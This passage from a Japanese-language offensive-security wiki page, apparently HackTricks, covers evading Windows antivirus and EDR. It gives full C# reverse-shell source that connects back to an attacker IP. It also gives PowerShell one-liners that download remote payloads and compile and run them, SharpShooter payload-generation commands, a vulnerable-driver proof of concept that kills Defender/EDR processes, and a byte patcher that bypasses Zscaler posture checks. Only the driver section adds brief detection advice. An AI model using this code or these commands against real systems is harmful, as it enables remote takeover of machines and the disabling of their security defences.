#This will generate a meterpreter xml and a rcc file for msfconsole
```
今、**lister**を`msfconsole -r file.rc`で**開始**し、**xmlペイロード**を次のように**実行**します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のディフェンダーはプロセスを非常に速く終了させます。**

### 自分自身のリバースシェルをコンパイルする

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC#リバースシェル

次のコマンドでコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用するには：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラの使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# オブフスケーターのリスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Pythonを使用したインジェクターのビルド例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603は、ランサムウェアを展開する前にエンドポイント保護を無効にするために、**Antivirus Terminator**という小さなコンソールユーティリティを利用しました。このツールは**独自の脆弱だが*署名された*ドライバ**を持ち、それを悪用して、Protected-Process-Light (PPL) AVサービスさえもブロックできない特権カーネル操作を発行します。

主なポイント
1. **署名されたドライバ**: ディスクに配信されるファイルは`ServiceMouse.sys`ですが、バイナリはAntiy Labsの「System In-Depth Analysis Toolkit」からの正当な署名付きドライバ`AToolsKrnl64.sys`です。このドライバは有効なMicrosoft署名を持っているため、Driver-Signature-Enforcement (DSE)が有効な場合でもロードされます。
2. **サービスのインストール**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを**カーネルサービス**として登録し、2行目はそれを開始して`\\.\ServiceMouse`がユーザーランドからアクセス可能になるようにします。
3. **ドライバによって公開されるIOCTL**
| IOCTLコード | 機能                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PIDによって任意のプロセスを終了する（Defender/EDRサービスを終了するために使用） |
| `0x990000D0` | ディスク上の任意のファイルを削除する |
| `0x990001D0` | ドライバをアンロードし、サービスを削除する |

最小限のCの概念実証:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **なぜ機能するのか**: BYOVDはユーザーモードの保護を完全にスキップします。カーネル内で実行されるコードは*保護された*プロセスを開いたり、それを終了させたり、PPL/PP、ELAMまたは他のハードニング機能に関係なくカーネルオブジェクトを改ざんすることができます。

検出 / 緩和
• Microsoftの脆弱ドライバブロックリスト（`HVCI`, `Smart App Control`）を有効にして、Windowsが`AToolsKrnl64.sys`のロードを拒否するようにします。
• 新しい*カーネル*サービスの作成を監視し、ドライバが世界書き込み可能なディレクトリからロードされた場合や許可リストに存在しない場合に警告します。
• カスタムデバイスオブジェクトへのユーザーモードハンドルを監視し、その後に疑わしい`DeviceIoControl`呼び出しが続くのを見守ります。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscalerの**Client Connector**は、デバイスの姿勢ルールをローカルで適用し、結果を他のコンポーネントに伝えるためにWindows RPCに依存しています。2つの弱い設計選択により、完全なバイパスが可能になります：

1. 姿勢評価は**完全にクライアント側**で行われます（ブール値がサーバーに送信されます）。
2. 内部RPCエンドポイントは、接続する実行可能ファイルが**Zscalerによって署名されている**ことのみを検証します（`WinVerifyTrust`を介して）。

**ディスク上の4つの署名されたバイナリをパッチすることにより**、両方のメカニズムを無効化できます：

| バイナリ | パッチされた元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に`1`を返すため、すべてのチェックが準拠します |
| `ZSAService.exe` | `WinVerifyTrust`への間接呼び出し | NOP-ed ⇒ どんな（署名されていない）プロセスでもRPCパイプにバインドできます |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`に置き換えられました |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡されました |

最小限のパッチャー抜粋:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後：

* **すべての** ポスチャーチェックが **緑/準拠** を表示します。
* 署名されていないまたは変更されたバイナリが、名前付きパイプRPCエンドポイント（例： `\\RPC Control\\ZSATrayManager_talk_to_me`）を開くことができます。
* 侵害されたホストは、Zscalerポリシーによって定義された内部ネットワークへの無制限のアクセスを得ます。

このケーススタディは、純粋にクライアント側の信頼決定と単純な署名チェックがいくつかのバイトパッチでどのように打破されるかを示しています。

## 参考文献

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
